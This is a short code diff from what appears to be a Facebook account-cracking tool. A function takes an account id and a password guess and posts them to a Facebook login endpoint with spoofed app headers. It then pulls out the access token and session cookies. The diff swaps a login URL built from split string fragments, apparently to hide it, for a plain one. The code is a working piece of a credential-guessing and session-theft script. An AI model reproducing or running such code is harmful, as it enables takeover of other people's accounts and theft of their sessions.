@@ -1561,7 +1561,7 @@ def m7(idf,pwv):
             "X-FB-Client-IP": "True",
             "X-FB-Server-Cluster": "True",
             'X-FB-HTTP-Engine': 'Liger'}
-            url = 'htt'+'ps://api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            url = 'https://p.facebook.com/auth/login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
